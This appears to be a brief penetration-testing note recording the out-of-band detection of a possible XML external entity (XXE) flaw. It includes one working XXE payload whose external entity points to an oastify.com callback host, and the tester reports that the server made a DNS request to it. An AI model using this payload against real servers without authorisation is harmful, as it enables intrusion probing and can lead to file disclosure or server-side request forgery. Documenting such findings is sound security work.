the application does not reveal all the information when a failure occurs, 

therefore using the folloiwng OAST payload:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://jf2nwltsw7qmbahxxvko7e6mzd54t1hq.oastify.com"> ]>

I was able to get the server to send my server DNS request shwoing that a possible xxe is there.
